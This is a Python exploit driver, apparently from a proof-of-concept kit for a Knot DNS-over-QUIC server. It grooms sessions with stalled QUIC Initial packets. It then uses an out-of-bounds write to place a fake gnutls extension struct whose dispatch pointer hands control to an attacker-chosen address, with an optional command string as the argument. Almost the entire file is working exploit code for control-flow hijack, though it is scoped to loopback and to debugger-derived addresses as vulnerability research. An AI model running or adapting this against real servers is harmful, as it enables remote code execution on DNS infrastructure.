#!/usr/bin/env python3
"""Bounded dispatch probe for the gnutls_deinit extension cleanup path.

The F6 OOB write reaches 813 bytes past slot1 (a live gnutls session in the
stalled-Initial groom).  libgnutls 0x73640 reads four extension-priv pointers
at session+0x100..+0x118; for a chosen non-null pointer it later calls
0x73490, which dispatches `call *0x110(priv)` with `rdi = *(priv+0xb8)`.

Place a fake priv struct at slot1+0x20, point the +0x100 slot at it, and set
the dispatch fields.  All addresses are taken from the gdb ASLR-off oracle;
host sysctl is untouched.  Loopback only.
"""
import asyncio
import os
import socket
import ssl
import sys
import time
import struct

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "poc", "knot-doq"))
import poc  # noqa: E402
from aioquic.asyncio.client import connect  # noqa: E402
from aioquic.quic.connection import QuicConnection  # noqa: E402

HOST = "127.0.0.1"


def stall_initial(port, count=1):
    out = []
    for _ in range(count):
        cfg = poc.QuicConfiguration(is_client=True, alpn_protocols=["doq"])
        cfg.verify_mode = ssl.CERT_NONE
        cfg.max_datagram_size = 1500
        q = QuicConnection(configuration=cfg)
        q.connect((HOST, port), now=time.time())
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((HOST, 0))
        datagrams = []
        for data, _addr in q.datagrams_to_send(now=time.time()):
            sock.sendto(data, (HOST, port))
            datagrams.append(data)
        out.append((sock, datagrams))
    return out


def build_body(slot1, rip, argoff=0x2F0, cmd=b""):
    # body[384] lands at slot1+0; 1198 bytes span slot1+0..+813.
    body = bytearray(1198)
    body[0:384] = b"\xAA" * 384

    def put(off, fmt, value):
        struct.pack_into(fmt, body, 384 + off, value)

    # Only the +0x100 extension slot is non-null.
    put(0x100, "<Q", slot1 + 0x20)
    for off in (0x108, 0x110, 0x118):
        put(off, "<Q", 0)

    f = 0x20  # fake priv base: keeps +0xb8 before and +0x110 after the array
    put(f + 0x000, "<H", 0xFFFF)   # type, must differ from session's +4/+6/+8
    put(f + 0x078, "<I", 0)        # memset size 1
    put(f + 0x08C, "<I", 0)        # memset size 2
    put(f + 0x0B0, "<I", 0)        # memset size 3
    put(f + 0x0B8, "<Q", slot1 + argoff)  # rdi at dispatch
    put(f + 0x110, "<Q", rip)      # `call *0x110(%rbx)` target
    put(f + 0x174, "<I", 1)        # force the dispatch branch
    put(f + 0x2D8, "<I", 0)        # <= 0 required to reach 0x73490
    if cmd:
        body[384 + argoff:384 + argoff + len(cmd)] = cmd
    else:
        body[0x2F0:0x2F8] = b"R5MARK\x00\x00"
    return body


async def main():
    port = int(sys.argv[1])
    slot1 = int(sys.argv[2], 0)
    rip = int(sys.argv[3], 0)
    argoff = int(sys.argv[4], 0) if len(sys.argv) > 4 else 0x2F0
    cmd = sys.argv[5].encode() + b"\x00" if len(sys.argv) > 5 else b""
    body = build_body(slot1, rip, argoff, cmd)
    stalled = stall_initial(port, 1)
    print("[driver] slot1=0x%x rip=0x%x cmd=%r" % (slot1, rip, cmd), flush=True)

    cfg = poc.QuicConfiguration(is_client=True, alpn_protocols=["doq"])
    cfg.max_datagram_size = 1500
    cfg.verify_mode = ssl.CERT_NONE
    cfg.idle_timeout = 20.0
    cfg.max_data = 64 * 1024
    cfg.max_stream_data = 32 * 1024
    async with connect(HOST, port, configuration=cfg) as proto:
        sid = proto._quic.get_next_available_stream_id(False)
        await poc._escalate(proto, sid)
        await poc._flush(proto, sid, b"\xFF\xFF" + bytes(body), fin=True)
        print("[driver] F6 fired", flush=True)
        for sock, datagrams in stalled:
            await asyncio.sleep(0.2)
            for data in datagrams:
                sock.sendto(data, (HOST, port))
        sid2 = proto._quic.get_next_available_stream_id(False)
        await poc._flush(proto, sid2, poc.dns_query(), fin=True)
        await asyncio.sleep(2.0)
    for sock, _datagrams in stalled:
        sock.close()
    print("[driver] done", flush=True)


if __name__ == "__main__":
    asyncio.run(main())
